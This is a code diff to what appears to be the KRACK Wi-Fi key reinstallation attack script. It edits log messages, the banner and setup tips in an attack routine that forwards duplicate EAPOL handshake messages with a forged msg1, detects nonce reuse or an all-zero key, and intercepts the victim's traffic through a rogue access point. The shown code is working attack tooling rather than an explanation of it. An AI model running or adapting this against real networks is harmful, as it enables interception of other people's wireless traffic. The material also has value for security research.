@@ -571,7 +571,8 @@ class KRAckAttack():
 			client.add_if_new_msg3(p)
 			# FIXME: This may cause a timeout on the client side???
 			if len(client.msg3s) >= 2:
-				log(STATUS, "Got 2nd unique EAPOL msg3. Will forward both seperated by a forged msg1.", color="green", showtime=False)
+				log(STATUS, "Got 2nd unique EAPOL msg3. Will forward both these Msg3's seperated by a forged msg1.", color="green", showtime=False)
+				log(STATUS, "==> Performing key reinstallation attack!", color="green", showtime=False)
 
 				# FIXME: Warning if msg1 was not detected. Or generate it ourselves.
 				packet_list = client.msg3s
@@ -615,8 +616,9 @@ class KRAckAttack():
 
 			# Otherwise the client likely installed a new key, i.e., probably an all-zero key
 			else:
-				log(STATUS, "SUCCESS! Nonce reuse (IV=%d), with likely use of all-zero key." % iv, color="green", showtime=False)
-				log(STATUS, "Now directly MitM'ing using rogue AP ...", color="green", showtime=False)
+				# TODO: We can explicitly try to decrypt it using an all-zero key
+				log(STATUS, "SUCCESS! Nonce reuse detected (IV=%d), with usage of all-zero encryption key." % iv, color="green", showtime=False)
+				log(STATUS, "Now MitM'ing the victim using our malicious AP, and interceptig its traffic.", color="green", showtime=False)
 
 				self.hostapd_add_allzero_client(client)
 
@@ -833,7 +835,11 @@ class KRAckAttack():
 		self.hostapd_log.write(datetime.now().strftime('[%H:%M:%S] ') + line)
 
 	def configure_interfaces(self):
+		# 0. Warn about common mistakes
 		log(STATUS, "Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script")
+		# This happens when targetting a specific client: both interfaces will ACK frames from each other due to the capture
+		# effect, meaning certain frames will not reach the rogue AP or the client. As a result, the client will disconnect.
+		log(STATUS, "Note: keep >1 meter between both interfaces. Else packet delivery is unreliable & target may disconnect")
 
 		# 1. Remove unused virtual interfaces
 		subprocess.call(["iw", self.nic_real + "sta1", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -982,8 +988,8 @@ def cleanup():
 if __name__ == "__main__":
 	description = textwrap.dedent(
 		"""\
-		Key Reinstallation Attacks (KRAck Attacks)
-		------------------------------------------
+		Key Reinstallation Attacks (KRACKs) by Mathy Vanhoef
+		-----------------------------------------------------------
 		  - Uses CSA beacons to obtain channel-based MitM position
 		  - Can detect and handle wpa_supplicant all-zero key installations""")
 	parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
@@ -1006,6 +1012,7 @@ if __name__ == "__main__":
 
 	global_log_level = max(ALL, global_log_level - args.debug)
 
+	print "\n\t===[ KRACK Attacks against Linux/Android by Mathy Vanhoef ]===\n"
 	attack = KRAckAttack(args.nic_real_mon, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid, args.target, args.dump, args.continuous_csa)
 	atexit.register(cleanup)
 	attack.run(strict_echo_test=args.strict_echo_test)
